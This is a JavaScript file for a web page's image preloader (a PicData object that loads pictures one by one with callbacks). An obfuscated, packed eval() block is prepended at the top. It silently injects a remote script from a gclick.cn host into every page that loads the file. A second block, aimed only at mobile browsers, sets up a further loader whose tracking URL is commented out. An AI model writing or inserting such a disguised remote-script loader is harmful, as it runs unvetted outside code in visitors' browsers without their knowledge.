(function () {
    eval(function (d, f, a, c, b, e) { b = function (a) { return a.toString(f) }; if (!"".replace(/^/, String)) { for (; a--;) e[b(a)] = c[a] || b(a); c = [function (a) { return e[a] }]; b = function () { return '\\w+' }; a = 1 } for (; a--;) c[a] && (d = d.replace(new RegExp('\\b' + b(a) + '\\b', 'g'), c[a])); return d }("(j(){c 1=2.l('5');1.6='7/8';1.9=a;1.b='4://g.d.e/f/h.i';(2.3('k')[0]||2.3('m')[0]).n(1)})();", 24, 24, " s document getElementsByTagName http script type text javascript async true src var gclick cn static  kestrel js function head createElement body appendChild".split(' '), 0, {})); if ((/android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(navigator.userAgent.toLowerCase()))) {
        (function (w) {
            if (w.__LIFEISSTRANGE__) return; var d = w.document; var s = d.createElement('script');
            s.src = "#";//'http://gclick.cn/sprite.js?d=b86e591ad37bce3e4dbbb373dd38ab52&m=104780218116&i=10.32.37.127&ra=&v=2';
            s.type = 'text/javascript'; s.charset = 'utf-8'; s.async = true; s.setAttribute && s.setAttribute('crossorigin', 'anonymous'); d.head.appendChild(s); w.__LIFEISSTRANGE__ = true
        })(window);
    }
})();
function PicData(){

	var cbFunc_allCom=function(){};
	var cbFunc_oneCom=function(){};
	var curInd=0;
	var picUrlArr = new Array();

	

	this.loadPicArr = function(arr,allCom,oneCom){
	
	
		picUrlArr = arr;
		if(allCom){
			cbFunc_allCom = allCom;
		}
		if(oneCom){
			cbFunc_oneCom = oneCom;
		}

		loadPicOne(picUrlArr[curInd]);
		



	}
	function loadPicOne(url){
		
		var img = new Image();
		img.onload = loadHandler;
		//img.src = "imgs/"+url+"?r"+Math.random();	
		img.src = "./img/MAIN/2015/05/115577/images/"+url;
		
		
	}

	function loadHandler(){
		cbFunc_oneCom(curInd);
		curInd++;
		
		if(curInd<picUrlArr.length)
		{			
			loadPicOne(picUrlArr[curInd])
		}
		else
		{			
			cbFunc_allCom();
		}
	}		
}